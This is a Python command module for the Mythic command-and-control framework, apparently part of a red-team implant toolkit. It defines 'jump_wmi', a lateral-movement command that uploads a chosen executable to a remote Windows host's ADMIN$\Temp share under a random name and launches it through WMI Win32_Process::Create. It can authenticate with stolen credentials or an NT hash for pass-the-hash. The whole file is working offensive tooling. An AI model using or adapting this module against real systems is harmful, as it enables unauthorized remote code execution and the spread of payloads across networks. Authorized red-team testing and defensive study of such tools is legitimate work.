import random
import string
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class JumpWmiArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="target",
                cli_name="Target",
                display_name="Target",
                type=ParameterType.String,
                description="Hostname or IP address of the remote target.",
                parameter_group_info=[
                    ParameterGroupInfo(required=True, ui_position=1)
                ]
            ),
            CommandParameter(
                name="payload",
                cli_name="Payload",
                display_name="Payload",
                type=ParameterType.File,
                description="Executable to upload and run on the remote host.",
                parameter_group_info=[
                    ParameterGroupInfo(required=True, ui_position=2)
                ]
            ),
            CommandParameter(
                name="command",
                cli_name="Command",
                display_name="Extra Arguments",
                type=ParameterType.String,
                description="Optional arguments to append to the executed binary path.",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=3)
                ]
            ),
            CommandParameter(
                name="username",
                cli_name="Username",
                display_name="Username",
                type=ParameterType.String,
                description=(
                    "Optional: DOMAIN\\\\User to authenticate with. "
                    "Leave blank to use the current process/thread token."
                ),
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=4)
                ]
            ),
            CommandParameter(
                name="password",
                cli_name="Password",
                display_name="Password",
                type=ParameterType.String,
                description="Optional: Password for the specified user.",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=5)
                ]
            ),
            CommandParameter(
                name="hash",
                cli_name="Hash",
                display_name="NT Hash",
                type=ParameterType.String,
                description="Optional: NT hash (hex) for pass-the-hash authentication. Supply instead of Password.",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=6)
                ]
            ),
        ]

    async def parse_arguments(self):
        raise ValueError("Must use the modal or supply named arguments")

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class JumpWmiCommand(CommandBase):
    cmd = "jump_wmi"
    needs_admin = False
    help_cmd = "jump_wmi -Target <host> -Payload <file> [-Command <extra args>] [-Username DOMAIN\\user] [-Password pass | -Hash NTHASH]"
    description = (
        "Lateral movement via WMI Win32_Process::Create over DCOM. "
        "Uploads a payload to the remote host's ADMIN$\\Temp share under a random 10-character name, "
        "then spawns it via Win32_Process::Create. "
        "Optionally authenticate with explicit credentials or an NT hash (pass-the-hash); "
        "otherwise the current token is used."
    )
    version = 1
    author = "@Lavender-exe"
    attackmapping = ["T1021.006", "T1047"]
    argument_class = JumpWmiArguments
    attributes = CommandAttributes(
        builtin=False,
        supported_os=[SupportedOS.Windows],
        suggested_command=False,
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        try:
            target  = taskData.args.get_arg("target")
            file_id = taskData.args.get_arg("payload")
            password = taskData.args.get_arg("password") or ""
            hash_val = taskData.args.get_arg("hash") or ""

            if password and hash_val:
                raise Exception("Supply either Password or Hash, not both.")

            rand_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + ".exe"

            taskData.args.remove_arg("payload")
            taskData.args.add_arg("file_name", rand_name)
            taskData.args.add_arg("file_id", file_id)

            auth_note = ""
            username = taskData.args.get_arg("username") or ""
            if hash_val and username:
                auth_note = f" [PTH: {username}]"
            elif password and username:
                auth_note = f" [creds: {username}]"

            response.DisplayParams = f"{target} -> \\\\{target}\\ADMIN$\\Temp\\{rand_name}{auth_note}"
        except Exception as e:
            raise Exception(str(e))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
